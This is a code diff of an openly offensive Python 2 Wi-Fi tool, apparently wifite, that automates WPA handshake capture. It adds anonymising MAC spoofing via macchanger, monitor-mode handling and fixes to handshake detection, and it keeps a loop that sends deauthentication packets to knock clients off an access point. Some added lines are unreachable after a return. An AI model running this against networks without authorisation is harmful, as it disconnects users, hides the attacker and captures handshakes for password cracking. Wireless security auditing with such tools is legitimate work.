@@ -44,14 +44,19 @@ REVISION = 83
 STRIP_HANDSHAKE      = True # Use pyrit or tshark (if applicable) to strip handshake
 WPA_DEAUTH_TIMEOUT   = 10   # Time to wait between deauthentication bursts (in seconds)
 WPA_ATTACK_TIMEOUT   = 500  # Total time to allow for a handshake attack (in seconds)
-HANDSHAKE_DIR        = 'hs' # Directory in which handshakes .cap files are stored
 
+HANDSHAKE_DIR        = 'hs' # Directory in which handshakes .cap files are stored
 # Strip file path separator if needed
 if HANDSHAKE_DIR[-1] == os.sep: HANDSHAKE_DIR = HANDSHAKE_DIR[:-1]
 
 # Program variables
-TARGETS_REMAINING = 0  # Number of access points remaining to attack
-WPA_CAPS_TO_CRACK = [] # list of .cap files to crack (full of CapFile objects)
+IFACE_TO_TAKE_DOWN = '' # Interface that wifite puts into monitor mode
+                        # It's our job to put it out of monitor mode after the attacks
+ORIGINAL_IFACE_MAC = ('', '') # Original interface name[0] and MAC address[1] (before spoofing)
+DO_NOT_CHANGE_MAC  = False # Flag for disabling MAC anonymizer
+TARGETS_REMAINING  = 0  # Number of access points remaining to attack
+WPA_CAPS_TO_CRACK  = [] # list of .cap files to crack (full of CapFile objects)
+
 
 # Console colors
 W  = "\033[0m"  # white (normal)
@@ -117,7 +122,7 @@ class Client:
 		return s
 
 
-def scan(channel=0, iface='', bssid='', first_try=True):
+def scan(channel=0, iface='', bssid=''):
 	"""
 		Scans for access points. Asks user to select target(s).
 		Returns list of selected targets and list of clients.
@@ -125,8 +130,8 @@ def scan(channel=0, iface='', bssid='', first_try=True):
 	remove_airodump_files(temp + 'wifite')
 	
 	command = ['airodump-ng', 
-						'-a', # only show associated clients
-						'-w', temp + 'wifite'] # output file
+	           '-a', # only show associated clients
+	           '-w', temp + 'wifite'] # output file
 	if channel != 0:
 		command.append('-c')
 		command.append(str(channel))
@@ -142,12 +147,9 @@ def scan(channel=0, iface='', bssid='', first_try=True):
 		while True:
 			time.sleep(0.3)
 			if not os.path.exists(temp + 'wifite-01.csv'):
-				if not first_try:
-					print R + ' unable to generate airodump-ng CSV'
-					print R + ' you may want to disable & re-enable your wifi device'
-					exit_gracefully(1)
-				call(['airmon-ng', 'stop', iface], stdout=DN, stderr=DN)
-				return scan(channel=channel, iface=iface, bssid=bssid, first_try=False)
+				print R + ' unable to generate airodump-ng CSV file' + W
+				print R + ' you may want to disconnect/reconnect your wifi device' + W
+				exit_gracefully(1)
 				
 			(targets, clients) = parse_csv(temp + 'wifite-01.csv')
 			print "\r scanning. %d target%s and %d client%s found" % (
@@ -246,6 +248,34 @@ def parse_csv(filename):
 				clients.append(c)
 	return (targets, clients)
 
+
+
+def enable_monitor_mode(iface):
+	"""
+		Uses airmon-ng to put a device into Monitor Mode.
+		Then uses the get_iface() method to retrieve the new interface's name.
+		Sets global variable IFACE_TO_TAKE_DOWN as well.
+	"""
+	global IFACE_TO_TAKE_DOWN
+	print ' putting %s into monitor mode...' % (iface),
+	stdout.flush()
+	call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
+	print 'done'
+	IFACE_TO_TAKE_DOWN = get_iface()
+	return IFACE_TO_TAKE_DOWN
+
+
+def disable_monitor_mode():
+	"""
+		The program may have enabled monitor mode on a wireless interface.
+		We want to disable this before we exit, so we will do that.
+	"""
+	if IFACE_TO_TAKE_DOWN == '': return
+	call(['airmon-ng', 'stop', IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
+	print ' disabled monitor mode on %s' % IFACE_TO_TAKE_DOWN
+
+
+
 def get_iface():
 	"""
 		Get the wireless interface in monitor mode. 
@@ -255,11 +285,10 @@ def get_iface():
 		Uses airmon-ng to put device in monitor mode if needed.
 		Returns the name (String) of the interface chosen in monitor mode.
 	"""
-	proc  = Popen(['iwconfig'], stdout=PIPE,stderr=PIPE)
-	txt   = proc.communicate()[0]
+	proc  = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
 	iface = ''
 	monitors = []
-	for line in txt.split('\n'):
+	for line in proc.communicate()[0].split('\n'):
 		if len(line) == 0: continue
 		if ord(line[0]) != 32: # Doesn't start with space
 			iface = line[:line.find(' ')] # is the interface
@@ -269,35 +298,40 @@ def get_iface():
 	# only one device
 	if len(monitors) == 1: return monitors[0]
 	elif len(monitors) > 1:
-		print " Interfaces in monitor mode:"
+		print " interfaces in monitor mode:"
 		for i, monitor in enumerate(monitors):
 			print "  %d. %s" % (i + 1, monitor)
 		i = get_input(stop=len(monitors))
 		return monitors[i - 1]
 	
-	proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=PIPE)
-	txt   = proc.communicate()[0]
-	for line in txt.split('\n'):
+	proc  = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
+	for line in proc.communicate()[0].split('\n'):
 		if len(line) == 0 or line.startswith('Interface'): continue
 		monitors.append(line[:line.find('\t')])
 	
 	if len(monitors) == 0:
-		print R + " No wireless interfaces were found."
-		print R + " You need to plug in a wifi device or install drivers."
-		print R + " The program will now exit."
+		print R + " no wireless interfaces were found."
+		print R + " you need to plug in a wifi device or install drivers."
+		print R + " the program will now exit."
 		exit_gracefully(0)
 	
 	elif len(monitors) == 1:
-		print ' '.join(['airmon-ng', 'start', monitors[0]])
-		call(['airmon-ng', 'start', monitors[0]], stdout=DN, stderr=DN)
-		return get_iface()
+		mac_anonymize(monitors[0])
+		
+		return enable_monitor_mode(monitors[0])
+		
+		IFACE_TO_TAKE_DOWN = get_iface() # recursive call
+		return IFACE_TO_TAKE_DOWN
 	
-	print " Select a device to put into monitor mode:"
+	print " select a device to put into monitor mode:"
 	for i, monitor in enumerate(monitors):
 		print "  %d. %s" % (i + 1, monitor)
 	i = get_input(stop=len(monitors))
-	call(['airmon-ng', 'start', monitors[i-1]], stdout=DN, stderr=DN)
-	return get_iface() # recursive call
+	
+	mac_anonymize(monitors[i-1])
+	
+	enable_monitor_mode(monitors[i-1])
+	
 
 def get_input(start=1, stop=1, message=''):
 	if message == '': message = ' enter a number between %s and %s:' % (start, stop)
@@ -314,12 +348,14 @@ def get_input(start=1, stop=1, message=''):
 				print 'invalid input, try again.'
 	return i
 
+
 def handle_args():
 	"""
 		Handles command-line arguments, sets variables.
 	"""
 	args = argv[1:]
-	print "Arguments: %s" % str(args)
+	# TODO allow user to set global variables
+	# print " arguments: %s" % str(args)
 
 
 def has_handshake(target, capfile):
@@ -371,6 +407,15 @@ def has_handshake(target, capfile):
 				while line.find('  ') != -1: line = line.replace('  ', ' ')
 				
 				fields = line.split(' ')
+				
+				# Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
+				# This catches this glitch and fixes it.
+				if len(fields) < 8: 
+					continue
+				elif len(fields) == 8:
+					fields.append('(msg')
+					fields.append('3/4)')
+				
 				src = fields[2].lower() # Source MAC address
 				dst = fields[4].lower() # Destination MAC address
 				msg = fields[9][0]      # The message number (1, 2, 3, or 4)
@@ -384,6 +429,7 @@ def has_handshake(target, capfile):
 				if int(msg) != msg_num: continue
 				msg_num += 1
 				
+				# We only need the first 3 messages of the 4-way handshake (according to aircrack-ng)
 				if msg_num == 4: return True
 		return False
 	
@@ -492,12 +538,16 @@ def strip_handshake(capfile):
 	else:
 		print " unable to strip .cap file: neither pyrit nor tshark were found"
 
+
 def attack_wpa(iface, target, clients):
 	""" 
 		Opens an airodump capture on the target, dumping to a file.
 		During the capture, sends deauthentication packets to the target both as
 		general deauthentication packets and specific packets aimed at connected clients.
 		Waits until a handshake is captured.
+			"iface"   - interface to capture on
+			"target"  - Target object containing info on access point
+			"clients" - List of Client objects associated with the target
 		Returns True if handshake was found, False otherwise
 	"""
 	
@@ -536,12 +586,14 @@ def attack_wpa(iface, target, clients):
 		
 		seconds_running = 0
 		
-		target_clients = []
+		target_clients = clients[:]
 		client_index = -1
 		# Build a new list of clients which are connected to target access point
+		"""
 		for c in clients:
 			if c.station == target.bssid:
 				target_clients.append(c)
+		"""
 		
 		# Deauth and check-for-handshake loop
 		while not got_handshake and seconds_running < WPA_ATTACK_TIMEOUT:
@@ -572,7 +624,7 @@ def attack_wpa(iface, target, clients):
 				print "sent"
 			
 			# Copy current dump file for consistency
-			#call(['cp', temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp'])
+			if not os.path.exists(temp + 'wpa-01.cap'): continue
 			copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
 			
 			# Save copy of cap file
@@ -655,7 +707,7 @@ def attack_wpa(iface, target, clients):
 		os.kill(proc_read.pid, SIGINT)
 		os.kill(proc_deauth.pid, SIGINT)
 	except OSError: pass
-	#except UnboundLocalError: pass
+	except UnboundLocalError: pass # In case proc_deauth it not yet defined
 	
 	return got_handshake
 
@@ -674,6 +726,7 @@ def main():
 	global TARGETS_REMAINING
 	
 	iface = get_iface()
+	
 	(targets, clients) = scan(iface=iface)
 	
 	successful_wpa = 0
@@ -684,6 +737,7 @@ def main():
 		TARGETS_REMAINING -= 1
 		print "TARGET: %s (%s)" % (t.ssid, t.bssid)
 		
+		# Build list of clients connected to target
 		ts_clients = []
 		for c in clients:
 			if c.station == t.bssid:
@@ -711,7 +765,55 @@ def main():
 		for cap in WPA_CAPS_TO_CRACK:
 			print ' cracking "%s" (%s)' % (cap.ssid, cap.filename)
 			#wpa_crack(cap.filename, cap.ssid)
+	
+	exit_gracefully(0)
 
+
+def mac_anonymize(iface):
+	"""
+		Changes MAC address of 'iface' to a random as designated by "macchanger"
+		Uses -a switch so only last 6 hex chars are changed (vendor stays the same)
+		Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
+	"""
+	global ORIGINAL_IFACE_MAC
+	if DO_NOT_CHANGE_MAC: return
+	if not program_exists('macchanger'): return
+	
+	# Store old (current) MAC address
+	proc = Popen(['macchanger', '-s', iface], stdout=PIPE, stderr=DN)
+	proc.wait()
+	old_mac = proc.communicate()[0].split(' ')[2]
+	ORIGINAL_IFACE_MAC = (iface, old_mac)
+	
+	call(['ifconfig', iface, 'down'])
+	
+	print " changing %s's MAC from %s to" % (iface, old_mac),
+	# Change to new anonymous MAC address
+	proc = Popen(['macchanger', '-a', iface], stdout=PIPE, stderr=DN)
+	proc.wait()
+	result = proc.communicate()[0]
+	result = result.split('\n')[1].replace('   ', ' ')
+	new_mac = result.split(' ')[2]
+	print "%s..." % new_mac,
+	stdout.flush()
+	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
+	print 'done'
+
+def mac_change_back():
+	iface = ORIGINAL_IFACE_MAC[0]
+	old_mac = ORIGINAL_IFACE_MAC[1]
+	if iface == '' or old_mac == '': return
+	
+	print " changing mac back to %s..." % old_mac,
+	stdout.flush()
+	call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
+	proc = Popen(['macchanger', '-m', old_mac, iface], stdout=PIPE, stderr=DN)
+	proc.wait()
+	result = proc.communicate()[0]
+	call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
+	result = result.split('\n')[1].replace('   ', ' ')
+	result = result.split(' ')[2]
+	print "done"
 
 def exit_gracefully(code):
 	"""
@@ -719,9 +821,15 @@ def exit_gracefully(code):
 		We want to remove the temp folder and any files contained within it.
 		Removes the temp files/folder and exists with error code "code".
 	"""
+	# Remove temp files and folder
 	for file in os.listdir(temp):
 		os.remove(temp + file)
 	os.rmdir(temp)
+	# Disable monitor mode if enabled by us
+	disable_monitor_mode()
+	# Change MAC address back if spoofed
+	mac_change_back()
+	# GTFO
 	exit(code)
 
 
